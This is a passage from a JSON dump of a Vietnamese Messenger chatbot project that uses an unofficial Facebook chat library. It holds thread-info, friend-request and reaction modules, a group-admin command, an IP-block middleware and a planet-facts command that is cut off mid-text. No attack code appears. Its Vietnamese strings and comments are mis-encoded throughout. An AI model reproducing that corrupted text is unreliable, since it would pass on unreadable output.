messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n    \n    //! ƒë∆∞·ª£c t√¨m th·∫•y v√†o gi·ªØa th√°ng 8/2022 b·ªüi @KanzuWakazaki - ƒë√£ ƒë∆∞·ª£c chia s·∫ª cho @D-Jukie v√† Horizon Team Public group ü§¥\n    //* nh·ªØng code t∆∞∆°ng t·ª± muliti thread nh∆∞ n√†y ƒë·ªÅu c√≥ th·ªÉ l√† copy idea üêß\n    //* ƒë√£ √°p d·ª•ng v√†o fca m·ªõi(cloud - fca(private)) v√†o cu·ªëi th√°ng 8/2022 b·ªüi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team\n    //*c·∫≠p nh·∫≠t d·ª± √°n b·ªã b·ªè r∆°i n√†y v√†o ng√†y 19/11/2022 b·ªüi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nh·∫±m ƒë√°p ·ª©ng nhu c·∫ßu c·ªßa client !\n\n      if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n      \n      var Form = {};\n      var ThreadInfo = [];\n\n      threadID.map(function (x,y) {\n        Form[\"o\" + y] = {\n          doc_id: \"3449967031715030\",\n          query_params: {\n            id: x,\n            message_limit: 0,\n            load_messages: false,\n            load_read_receipts: false,\n            before: null\n          }\n        };\n      });\n\n    var form = {\n      queries: JSON.stringify(Form),\n      batch_name: \"MessengerGraphQLThreadFetcher\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function(resData) {\n      if (resData.error) {\n        callback(null,resData.error);\n        throw resData;\n      }\n      resData = resData.splice(0, resData.length - 1);\n      resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n      resData.map(function (x,y) {\n        ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n      });\n      if (Object.keys(resData).length == 1) {\n        callback(null, ThreadInfo[0]);\n      } else {\n      callback(null, ThreadInfo);\n      }\n    })\n    .catch(function(err) {\n\n      log.error(\"getThreadInfoGraphQL\", \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n    return callback(err);\n  });\n  return returnPromise;\n  };\n};","path":null,"size_bytes":8074,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/handleFriendRequest.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function handleFriendRequest(userID, accept, callback) {\n    if (utils.getType(accept) !== \"Boolean\") throw { error: \"Please pass a boolean as a second argument.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      viewer_id: userID,\n      \"frefs[0]\": \"jwl\",\n      floc: \"friend_center_requests\",\n      ref: \"/reqs.php\",\n      action: (accept ? \"confirm\" : \"reject\")\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/requests/friends/ajax/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.payload.err) throw { err: resData.payload.err };\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"handleFriendRequest\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1284,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/setMessageReaction.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function setMessageReaction(reaction, messageID, callback, forceCustomReaction) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    switch (reaction) {\n      case \"\\uD83D\\uDE0D\": //:heart_eyes:\n      case \"\\uD83D\\uDE06\": //:laughing:\n      case \"\\uD83D\\uDE2E\": //:open_mouth:\n      case \"\\uD83D\\uDE22\": //:cry:\n      case \"\\uD83D\\uDE20\": //:angry:\n      case \"\\uD83D\\uDC4D\": //:thumbsup:\n      case \"\\uD83D\\uDC4E\": //:thumbsdown:\n      case \"\\u2764\": //:heart:\n      case \"\\uD83D\\uDC97\": //:glowingheart:\n      case \"\":\n        //valid\n        break;\n      case \":heart_eyes:\":\n      case \":love:\":\n        reaction = \"\\uD83D\\uDE0D\";\n        break;\n      case \":laughing:\":\n      case \":haha:\":\n        reaction = \"\\uD83D\\uDE06\";\n        break;\n      case \":open_mouth:\":\n      case \":wow:\":\n        reaction = \"\\uD83D\\uDE2E\";\n        break;\n      case \":cry:\":\n      case \":sad:\":\n        reaction = \"\\uD83D\\uDE22\";\n        break;\n      case \":angry:\":\n        reaction = \"\\uD83D\\uDE20\";\n        break;\n      case \":thumbsup:\":\n      case \":like:\":\n        reaction = \"\\uD83D\\uDC4D\";\n        break;\n      case \":thumbsdown:\":\n      case \":dislike:\":\n        reaction = \"\\uD83D\\uDC4E\";\n        break;\n      case \":heart:\":\n        reaction = \"\\u2764\";\n        break;\n      case \":glowingheart:\":\n        reaction = \"\\uD83D\\uDC97\";\n        break;\n      default:\n        if (forceCustomReaction) break;\n        return callback({ error: \"Reaction is not a valid emoji.\" });\n    }\n\n    var variables = {\n      data: {\n        client_mutation_id: ctx.clientMutationId++,\n        actor_id: ctx.userID,\n        action: reaction == \"\" ? \"REMOVE_REACTION\" : \"ADD_REACTION\",\n        message_id: messageID,\n        reaction: reaction\n      }\n    };\n\n    var qs = {\n      doc_id: \"1491398900900362\",\n      variables: JSON.stringify(variables),\n      dpr: 1\n    };\n\n    defaultFuncs\n      .postFormData(\n        \"https://www.facebook.com/webgraphql/mutation/\",\n        ctx.jar,\n        {},\n        qs\n      )\n      .then(utils.parseAndCheckLogin(ctx.jar, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"setReaction returned empty object.\" };\n        if (resData.error) throw resData;\n        callback(null); \n      })\n      .catch(function (err) {\n        log.error(\"setReaction\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2833,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Html/Classic/style.css":{"content":"html {\n    background:#ecf0f1;\n  }\n  canvas {\n    display:block;\n    margin:auto;\n    background:#ecf0f1;\n  }","path":null,"size_bytes":109,"size_tokens":null},"modules/commands/box.js":{"content":"module.exports.config = {\n  name: \"box\",\n  version: \"1.1.0\",\n  hasPermssion: 0,\n  credits: \"Modified by Assistant\",\n  description: \"C√†i ƒë·∫∑t v√† th√¥ng tin nh√≥m\",\n  commandCategory: \"Qu·∫£n L√≠ Box\",\n  usages: \"<id/name/setname/setnameall/me qtv/setqtv/emoji/image/info>\",\n  cooldowns: 1,\n  dependencies: {\n    \"request\": \"\",\n    \"fs-extra\": \"\"\n  }\n};\n\nconst axios = require(\"axios\");\nconst fs = require(\"fs-extra\");\nconst request = require(\"request\");\n\nmodule.exports.run = async ({ api, event, args, Threads }) => {\n  const threadInfo = await api.getThreadInfo(event.threadID);\n\n  if (!args[0]) {\n    return api.sendMessage(\n      `====„Äé BOX CONFIG „Äè====\\n\n1. box id: L·∫•y ID nh√≥m\n2. box name: L·∫•y t√™n nh√≥m\n3. box me setqtv: Th√™m b·∫°n l√†m qu·∫£n tr·ªã vi√™n\n4. box setqtv <tag/response>: Th√™m ng∆∞·ªùi d√πng l√†m qu·∫£n tr·ªã vi√™n\n5. box emoji <icon>: ƒê·ªïi bi·ªÉu t∆∞·ª£ng nh√≥m\n6. box image <ph·∫£n h·ªìi ·∫£nh>: ƒê·ªïi ·∫£nh nh√≥m\n7. box info: L·∫•y th√¥ng tin nh√≥m`,\n      event.threadID\n    );\n  }\n\n  switch (args[0]) {\n    case \"id\":\n      return api.sendMessage(`ID nh√≥m: ${event.threadID}`, event.threadID);\n\n    case \"name\":\n      return api.sendMessage(\n        `T√™n nh√≥m: ${threadInfo.threadName}`,\n        event.threadID\n      );\n\n    case \"me\":\n      if (args[1] === \"setqtv\") {\n        if (!global.config.ADMINBOT.includes(event.senderID)) {\n          return api.sendMessage(\n            \"‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn ƒë·ªÉ t·ª± th√™m m√¨nh l√†m qu·∫£n tr·ªã vi√™n nh√≥m.\",\n            event.threadID\n          );\n        }\n        api.changeAdminStatus(event.threadID, event.senderID, true, (err) => {\n          if (err) {\n            return api.sendMessage(\n              \"‚ùå Kh√¥ng th·ªÉ th√™m b·∫°n l√†m qu·∫£n tr·ªã vi√™n nh√≥m.\",\n              event.threadID\n            );\n          }\n          api.sendMessage(\n            \"‚úÖ ƒê√£ th√™m b·∫°n l√†m qu·∫£n tr·ªã vi√™n nh√≥m.\",\n            event.threadID\n          );\n        });\n      }\n      break;\n\n    case \"setqtv\":\n      if (!threadInfo.adminIDs.some(admin => admin.id === event.senderID)) {\n        return api.sendMessage(\n          \"‚ùå Ch·ªâ qu·∫£n tr·ªã vi√™n nh√≥m m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh n√†y.\",\n          event.threadID,\n          event.messageID\n        );\n      }\n      const adminID = event.messageReply\n        ? event.messageReply.senderID\n        : Object.keys(event.mentions)[0];\n\n      if (!adminID) {\n        return api.sendMessage(\n          \"‚ùå Vui l√≤ng tag th√†nh vi√™n ho·∫∑c reply tin nh·∫Øn ƒë·ªÉ th√™m ng∆∞·ªùi ƒë√≥ l√†m qu·∫£n tr·ªã vi√™n.\",\n          event.threadID,\n          event.messageID\n        );\n      }\n      api.changeAdminStatus(event.threadID, adminID, true, (err) => {\n        if (err) {\n          return api.sendMessage(\n            \"‚ùå Kh√¥ng th·ªÉ th√™m ng∆∞·ªùi d√πng l√†m qu·∫£n tr·ªã vi√™n.\",\n            event.threadID,\n            event.messageID\n          );\n        }\n        api.sendMessage(\n          \"‚úÖ ƒê√£ th√™m ng∆∞·ªùi d√πng l√†m qu·∫£n tr·ªã vi√™n nh√≥m.\",\n          event.threadID,\n          event.messageID\n        );\n      });\n      break;\n\n    case \"emoji\":\n      const emoji = args[1];\n      if (!emoji)\n        return api.sendMessage(\"Vui l√≤ng nh·∫≠p bi·ªÉu t∆∞·ª£ng m·ªõi.\", event.threadID);\n\n      api.changeThreadEmoji(emoji, event.threadID, (err) => {\n        if (err)\n          return api.sendMessage(\n            \"Kh√¥ng th·ªÉ ƒë·ªïi bi·ªÉu t∆∞·ª£ng nh√≥m.\",\n            event.threadID\n          );\n        api.sendMessage(\"ƒê√£ ƒë·ªïi bi·ªÉu t∆∞·ª£ng nh√≥m.\", event.threadID);\n      });\n      break;\n\n    case \"image\":\n      if (\n        event.type !== \"message_reply\" ||\n        !event.messageReply.attachments ||\n        event.messageReply.attachments.length === 0\n      )\n        return api.sendMessage(\n          \"B·∫°n c·∫ßn reply m·ªôt ·∫£nh ƒë·ªÉ ƒë·ªïi ·∫£nh nh√≥m.\",\n          event.threadID\n        );\n\n      const imagePath = __dirname + \"/cache/group_image.png\";\n      const imageURL = event.messageReply.attachments[0].url;\n\n      request(imageURL)\n        .pipe(fs.createWriteStream(imagePath))\n        .on(\"close\", () =>\n          api.changeGroupImage(\n            fs.createReadStream(imagePath),\n            event.threadID,\n            () => fs.unlinkSync(imagePath)\n          )\n        );\n\n      return api.sendMessage(\"ƒêang c·∫≠p nh·∫≠t ·∫£nh nh√≥m...\", event.threadID);\n\n    case \"info\":\n      const admins = threadInfo.adminIDs.map(admin => admin.id);\n      const totalAdmins = admins.length;\n      const maleMembers = threadInfo.userInfo.filter(user => user.gender === \"MALE\").length;\n      const femaleMembers = threadInfo.userInfo.filter(user => user.gender === \"FEMALE\").length;\n\n      const prefix = global.config.PREFIX; \n\n      const groupImageURL = threadInfo.imageSrc;\n      const imagePath1 = __dirname + \"/cache/group_image1.png\";\n\n      const groupInfoMessage = \n        `=== [ Th√¥ng Tin Nh√≥m ] ===\\n\\n` +\n        `üåê T√™n nh√≥m: ${threadInfo.threadName}\\n` +\n        `üÜî ID nh√≥m: ${event.threadID}\\n` +\n        `üë• Th√†nh vi√™n: ${threadInfo.participantIDs.length}\\n` +\n        `üë® Nam: ${maleMembers}\\n` +\n        `üë© N·ªØ: ${femaleMembers}\\n` +\n        `üõ°Ô∏è Qu·∫£n tr·ªã vi√™n: ${totalAdmins}\\n` +\n        `üîë Prefix: ${prefix}\\n` +\n        `üí¨ T·ªïng s·ªë tin nh·∫Øn: ${threadInfo.messageCount}`;\n\n      if (groupImageURL) {\n        try {\n          const response = await axios.get(groupImageURL, { responseType: \"arraybuffer\" });\n          if (response.status === 200) {\n            fs.writeFileSync(imagePath1, response.data);\n            api.sendMessage(\n              {\n                body: groupInfoMessage,\n                attachment: fs.createReadStream(imagePath1),\n              },\n              event.threadID,\n              () => fs.unlinkSync(imagePath1)\n            );\n          }\n        } catch (error) {}\n      } else {\n        api.sendMessage(groupInfoMessage, event.threadID);\n      }\n      break;\n\n    default:\n      return api.sendMessage(\n        \"L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng xem danh s√°ch l·ªánh b·∫±ng c√°ch '#box'.\",\n        event.threadID\n      );\n  }\n};\n","path":null,"size_bytes":6139,"size_tokens":null},"blockIp.js":{"content":"const getIP = require('ipware')().get_ip;\nconst fs = require(\"fs-extra\");\nmodule.exports = function (req, res, next) {\n  const listIPBlocked = JSON.parse(fs.readFileSync('./blockedIP.json', { encoding: 'utf-8' }));\n  if (listIPBlocked.includes(getIP(req).clientIp)) {\n    res.status(403).send({\n      AUTHOR: 'R1zaX',\n      STATUS: 'ERROR 404',\n      MESSAGE: 'NGU TH√å CH·∫æT TH√îI, L·∫¶N SAU CH·ª™A T·∫¨T X·ªíN L√ÄM NH√â üòè',\n      INBOX: 'MU·ªêN G·ª† TH√å INB FACEBOOK'\n    });\n  } \n  else {\n    next();\n  }\n}","path":null,"size_bytes":514,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Index.js":{"content":"/* eslint-disable linebreak-style */\nmodule.exports = {\n    Default: require('./Base'),\n    GCM: require('./AES_256_GCM')\n};","path":null,"size_bytes":124,"size_tokens":null},"modules/commands/hanhtinh.js":{"content":"const fs = require(\"fs\");\n\nmodule.exports.config = {\n    name: \"hanhtinh\",\n    version: \"1.1.8\",\n    hasPermssion: 0,\n    credits: \"JRT fix by Jukie~~\",\n    description: \"Xem th√¥ng tin v·ªÅ h√†nh tinh\",\n    commandCategory: \"Ki·∫øn Th·ª©c\",\n    usages: \"\",\n    cooldowns: 5,\n};\n\nmodule.exports.handleReply = async ({ api, event, handleReply }) => {\n    const { threadID, messageID, senderID } = event;\n    switch (handleReply.type) {\n        case \"choosee\": {\n            const choose = parseInt(event.body);\n            if (isNaN(choose)) {\n                return api.sendMessage(\"üíüVui l√≤ng nh·∫≠p 1 con s·ªë\", threadID, messageID);\n            }\n            switch (choose) {\n                case 1: api.sendMessage(\"1. H·ªá M·∫∑t Tr·ªùi - The Sun ‚òÄ\\nM·∫∑t Tr·ªùi (ti·∫øng Anh: Sun; c√≤n g·ªçi l√† Th√°i D∆∞∆°ng ho·∫∑c Nh·∫≠t), l√† ng√¥i sao ·ªü trung t√¢m H·ªá M·∫∑t Tr·ªùi, chi·∫øm kho·∫£ng 99,86% kh·ªëi l∆∞·ª£ng c·ªßa H·ªá M·∫∑t Tr·ªùi. Tr√°i ƒê·∫•t v√† c√°c thi√™n th·ªÉ kh√°c nh∆∞ c√°c h√†nh tinh, ti·ªÉu h√†nh tinh, thi√™n th·∫°ch, sao ch·ªïi, v√† b·ª•i quay quanh M·∫∑t Tr·ªùi. Kho·∫£ng c√°ch trung b√¨nh gi·ªØa M·∫∑t Tr·ªùi v√† Tr√°i ƒê·∫•t x·∫•p x·ªâ 149,6 tri·ªáu kil√¥m√©t (1 ƒê∆°n v·ªã thi√™n vƒÉn AU) n√™n √°nh s√°ng M·∫∑t Tr·ªùi c·∫ßn 8 ph√∫t 19 gi√¢y m·ªõi ƒë·∫øn ƒë∆∞·ª£c Tr√°i ƒê·∫•t. Trong m·ªôt nƒÉm, kho·∫£ng c√°ch n√†y thay ƒë·ªïi t·ª´ 147,1 tri·ªáu kil√¥m√©t (0,9833 AU) ·ªü ƒëi·ªÉm c·∫≠n nh·∫≠t (kho·∫£ng ng√†y 3 th√°ng 1), t·ªõi xa nh·∫•t l√† 152,1 tri·ªáu kil√¥m√©t (1,017 AU) ·ªü ƒëi·ªÉm vi·ªÖn nh·∫≠t (kho·∫£ng ng√†y 4 th√°ng 7). NƒÉng l∆∞·ª£ng M·∫∑t Tr·ªùi ·ªü d·∫°ng √°nh s√°ng h·ªó tr·ª£ cho h·∫ßu h·∫øt s·ª± s·ªëng tr√™n Tr√°i ƒê·∫•t th√¥ng qua qu√° tr√¨nh quang h·ª£p, v√† ƒëi·ªÅu khi·ªÉn kh√≠ h·∫≠u c≈©ng nh∆∞ th·ªùi ti·∫øt tr√™n Tr√°i ƒê·∫•t. Th√†nh ph·∫ßn c·ªßa M·∫∑t Tr·ªùi g·ªìm hydro (kho·∫£ng 74% kh·ªëi l∆∞·ª£ng, hay 92% th·ªÉ t√≠ch), heli (kho·∫£ng 24% kh·ªëi l∆∞·ª£ng, 7% th·ªÉ t√≠ch), v√† m·ªôt l∆∞·ª£ng nh·ªè c√°c nguy√™n t·ªë kh√°c, g·ªìm s·∫Øt, nickel, oxy, silic, l∆∞u hu·ª≥nh, magi√™, carbon, neon, calci, v√† crom.\\nM·∫∑t Tr·ªùi c√≥ h·∫°ng quang ph·ªï G2V. G2 c√≥ nghƒ©a n√≥ c√≥ nhi·ªát ƒë·ªô b·ªÅ m·∫∑t x·∫•p x·ªâ 5.778 K (5.505 ¬∞C) khi·∫øn n√≥ c√≥ m√†u tr·∫Øng, v√† th∆∞·ªùng c√≥ m√†u v√†ng khi nh√¨n t·ª´ b·ªÅ m·∫∑t Tr√°i ƒê·∫•t b·ªüi s·ª± t√°n x·∫° kh√≠ quy·ªÉn. Ch√≠nh s·ª± t√°n x·∫° n√†y c·ªßa √°nh s√°ng ·ªü gi·ªõi h·∫°n cu·ªëi m√†u xanh c·ªßa quang ph·ªï khi·∫øn b·∫ßu tr·ªùi c√≥ m√†u xanh. Quang ph·ªï M·∫∑t Tr·ªùi c√≥ ch·ª©a c√°c v·∫°ch ion ho√° v√† kim lo·∫°i trung t√≠nh c≈©ng nh∆∞ c√°c ƒë∆∞·ªùng hydro r·∫•t y·∫øu. V (s·ªë 5 La M√£) trong l·ªõp quang ph·ªï th·ªÉ hi·ªán r·∫±ng M·∫∑t Tr·ªùi, nh∆∞ h·∫ßu h·∫øt c√°c ng√¥i sao kh√°c, l√† m·ªôt ng√¥i sao thu·ªôc d√£y ch√≠nh. ƒêi·ªÅu n√†y c√≥ nghƒ©a n√≥ t·∫°o ra nƒÉng l∆∞·ª£ng b·∫±ng t·ªïng h·ª£p h·∫°t nh√¢n c·ªßa h·∫°t nh√¢n hydro th√†nh heli. C√≥ h∆°n 100 tri·ªáu ng√¥i sao l·ªõp G2 trong Ng√¢n H√† c·ªßa ch√∫ng ta. T·ª´ng b·ªã coi l√† m·ªôt ng√¥i sao nh·ªè v√† kh√° t·∫ßm th∆∞·ªùng nh∆∞ng th·ª±c t·∫ø theo hi·ªÉu bi·∫øt hi·ªán t·∫°i, M·∫∑t Tr·ªùi s√°ng h∆°n 85% c√°c ng√¥i sao trong Ng√¢n H√† v·ªõi ƒëa s·ªë l√† c√°c sao l√πn ƒë·ªè.Qu·∫ßng n√≥ng c·ªßa M·∫∑t Tr·ªùi li√™n t·ª•c m·ªü r·ªông trong kh√¥ng gian v√† t·∫°o ra gi√≥ M·∫∑t Tr·ªùi l√† c√°c d√≤ng h·∫°t c√≥ v·∫≠n t·ªëc g·∫•p 5 l·∫ßn √¢m thanh - m·ªü r·ªông nh·∫≠t m√£n (Heliopause) t·ªõi kho·∫£ng c√°ch x·∫•p x·ªâ 100 AU. Bong b√≥ng trong m√¥i tr∆∞·ªùng li√™n sao ƒë∆∞·ª£c h√¨nh th√†nh b·ªüi gi√≥ m·∫∑t tr·ªùi, nh·∫≠t quy·ªÉn (heliosphere) l√† c·∫•u tr√∫c li√™n t·ª•c l·ªõn nh·∫•t trong H·ªá M·∫∑t Tr·ªùi.M·∫∑t Tr·ªùi hi·ªán ƒëang ƒëi xuy√™n qua ƒë√°m m√¢y Li√™n sao ƒê·ªãa ph∆∞∆°ng (Local Interstellar Cloud) trong v√πng B√≥ng ƒê·ªãa ph∆∞∆°ng (Local Bubble) m·∫≠t ƒë·ªô th·∫•p c·ªßa kh√≠ khu·∫øch t√°n nhi·ªát ƒë·ªô cao, ·ªü v√†nh trong c·ªßa Nh√°nh Orion c·ªßa Ng√¢n H√†, gi·ªØa nh√°nh Perseus v√† nh√°nh Sagittarius c·ªßa ng√¢n h√†. Trong 50 h·ªá sao g·∫ßn nh·∫•t b√™n trong 17 nƒÉm √°nh s√°ng t·ª´ Tr√°i ƒê·∫•t, M·∫∑t Tr·ªùi x·∫øp h·∫°ng 4 v·ªÅ kh·ªëi l∆∞·ª£ng nh∆∞ m·ªôt ng√¥i sao c·∫•p b·ªën (M = +4,83), d√π c√≥ m·ªôt s·ªë gi√° tr·ªã c·∫•p h∆°i kh√°c bi·ªát ƒë√£ ƒë∆∞·ª£c ƒë∆∞a ra, v√≠ d·ª• 4,85 v√† 4,81. M·∫∑t Tr·ªùi quay quanh trung t√¢m c·ªßa Ng√¢n H√† ·ªü kho·∫£ng c√°ch x·∫•p x·ªâ 24.000‚Äì26.000 nƒÉm √°nh s√°ng t·ª´ trung t√¢m Ng√¢n H√†, n√≥i chung di chuy·ªÉn theo h∆∞·ªõng ch√πm sao Cygnus v√† ho√†n th√†nh m·ªôt v√≤ng trong kho·∫£ng 225‚Äì250 tri·ªáu nƒÉm (m·ªôt nƒÉm ng√¢n h√†). T·ªëc ƒë·ªô tr√™n qu·ªπ ƒë·∫°o c·ªßa n√≥ ƒë∆∞·ª£c cho kho·∫£ng 250 ¬± 20, km/s nh∆∞ng m·ªôt ∆∞·ªõc t√≠nh m·ªõi ƒë∆∞a ra con s·ªë 251 km/s.\\nB·ªüi Ng√¢n H√† c·ªßa ch√∫ng ta ƒëang di chuy·ªÉn so v·ªõi M√†n b·ª©c x·∫° vi s√≥ng v≈© tr·ª• (CMB) theo h∆∞·ªõng ch√≤m sao Hydra v·ªõi t·ªëc ƒë·ªô 550 km/s, n√™n t·ªëc ƒë·ªô chuy·ªÉn ƒë·ªông c·ªßa n√≥ so v·ªõi CMB l√† kho·∫£ng 370 km/s theo h∆∞·ªõng ch√≤m sao Crater hay Leo.\", threadID, messageID); break;\n                case 2: api.sendMessage(\"2. Tr√°i ƒê·∫•t - Earthüåé\\n\\nTr√°i ƒê·∫•t hay ƒê·ªãa C·∫ßu (ch·ªØ H√°n: Âú∞ÁêÉ, ti·∫øng Anh: Earth), l√† h√†nh tinh th·ª© ba t√≠nh t·ª´ M·∫∑t Tr·ªùi, ƒë·ªìng th·ªùi c≈©ng l√† h√†nh tinh l·ªõn nh·∫•t trong c√°c h√†nh tinh ƒë·∫•t ƒë√° c·ªßa h·ªá M·∫∑t Tr·ªùi x√©t v·ªÅ b√°n k√≠nh, kh·ªëi l∆∞·ª£ng v√† m·∫≠t ƒë·ªô v·∫≠t ch·∫•t. Tr√°i ƒê·∫•t c√≤n ƒë∆∞·ª£c bi·∫øt t√™n v·ªõi c√°c t√™n g·ªçi (h√†nh tinh xanh), l√† nh√† c·ªßa h√†ng tri·ªáu lo√†i sinh v·∫≠t, trong ƒë√≥ c√≥ con ng∆∞·ªùi v√† cho ƒë·∫øn nay n√≥ l√† n∆°i duy nh·∫•t trong v≈© tr·ª• ƒë∆∞·ª£c bi·∫øt ƒë·∫øn l√† c√≥ s·ª± s·ªëng. H√†nh tinh n√†y ƒë∆∞·ª£c h√¨nh th√†nh c√°ch ƒë√¢y 4,55 t·ª∑ nƒÉm v√† s·ª± s·ªëng xu·∫•t hi·ªán tr√™n b·ªÅ m·∫∑t c·ªßa n√≥ kho·∫£ng 1 t·ª∑ nƒÉm tr∆∞·ªõc. K·ªÉ t·ª´ ƒë√≥, sinh quy·ªÉn, kh√≠ quy·ªÉn c·ªßa Tr√°i ƒê·∫•t v√† c√°c ƒëi·ªÅu ki·ªán v√¥ c∆° kh√°c ƒë√£ thay ƒë·ªïi ƒë√°ng k·ªÉ, t·∫°o ƒëi·ªÅu ki·ªán thu·∫≠n l·ª£i cho s·ª± ph·ªï bi·∫øn c·ªßa c√°c vi sinh v·∫≠t ∆∞a kh√≠ c≈©ng nh∆∞ s·ª± h√¨nh th√†nh c·ªßa t·∫ßng √¥z√¥n-l·ªõp b·∫£o v·ªá quan tr·ªçng, c√πng v·ªõi t·ª´ tr∆∞·ªùng c·ªßa Tr√°i ƒê·∫•t, ƒë√£ ngƒÉn ch·∫∑n c√°c b·ª©c x·∫° c√≥ h·∫°i v√† ch·ªü che cho s·ª± s·ªëng. C√°c ƒë·∫∑c ƒëi·ªÉm v·∫≠t l√Ω c·ªßa Tr√°i ƒê·∫•t c≈©ng nh∆∞ l·ªãch s·ª≠ ƒë·ªãa l√Ω hay qu·ªπ ƒë·∫°o, cho ph√©p s·ª± s·ªëng t·ªìn t·∫°i trong th·ªùi gian qua. Ng∆∞·ªùi ta ∆∞·ªõc t√≠nh r·∫±ng Tr√°i ƒê·∫•t ch·ªâ c√≤n c√≥ th·ªÉ h·ªó tr·ª£ s·ª± s·ªëng th√™m 1,5 t·ª∑ nƒÉm n·ªØa, tr∆∞·ªõc khi k√≠ch th∆∞·ªõc c·ªßa M·∫∑t Tr·ªùi tƒÉng l√™n (tr·ªü th√†nh sao kh·ªïng l·ªì ƒë·ªè) v√† ti√™u di·ªát h·∫øt s·ª± s·ªëng.B·ªÅ m·∫∑t Tr√°i ƒê·∫•t ƒë∆∞·ª£c chia th√†nh c√°c m·∫£ng ki·∫øn t·∫°o, ch√∫ng di chuy·ªÉn t·ª´ t·ª´ tr√™n b·ªÅ m·∫∑t Tr√°i ƒê·∫•t trong h√†ng tri·ªáu nƒÉm. Kho·∫£ng 71% b·ªÅ m·∫∑t Tr√°i ƒê·∫•t ƒë∆∞·ª£c bao ph·ªß b·ªüi c√°c ƒë·∫°i d∆∞∆°ng n∆∞·ªõc m·∫∑n, ph·∫ßn c√≤n l·∫°i l√† c√°c l·ª•c ƒë·ªãa v√† c√°c ƒë·∫£o. N∆∞·ªõc l√† th√†nh ph·∫ßn r·∫•t c·∫ßn thi·∫øt cho s·ª± s·ªëng v√† cho ƒë·∫øn nay con ng∆∞·ªùi v·∫´n ch∆∞a ph√°t hi·ªán th·∫•y s·ª± t·ªìn t·∫°i c·ªßa n√≥ tr√™n b·ªÅ m·∫∑t c·ªßa b·∫•t k√¨ h√†nh tinh n√†o kh√°c ngo·∫°i tr·ª´ sao H·ªèa l√† c√≥ n∆∞·ªõc b·ªã ƒë√≥ng bƒÉng ·ªü hai c·ª±c. Tuy nhi√™n, ng∆∞·ªùi ta c√≥ ch·ª©ng c·ª© x√°c ƒë·ªãnh ngu·ªìn n∆∞·ªõc c√≥ ·ªü Sao H·ªèa trong qu√° kh·ª©, v√† c√≥ th·ªÉ t·ªìn t·∫°i cho t·ªõi ng√†y nay. L√µi c·ªßa Tr√°i ƒê·∫•t v·∫´n ho·∫°t ƒë·ªông ƒë∆∞·ª£c bao b·ªçc b·ªüi l·ªõp manti r·∫Øn d√†y, l·ªõp l√µi ngo√†i l·ªèng t·∫°o ra t·ª´ tr∆∞·ªùng v√† l√µi s·∫Øt trong r·∫Øn.Tr√°i ƒê·∫•t t∆∞∆°ng t√°c v·ªõi c√°c v·∫≠t th·ªÉ kh√°c trong kh√¥ng gian bao g·ªìm M·∫∑t Tr·ªùi v√† M·∫∑t TrƒÉng. Hi·ªán qu√£ng th·ªùi gian Tr√°i ƒê·∫•t di 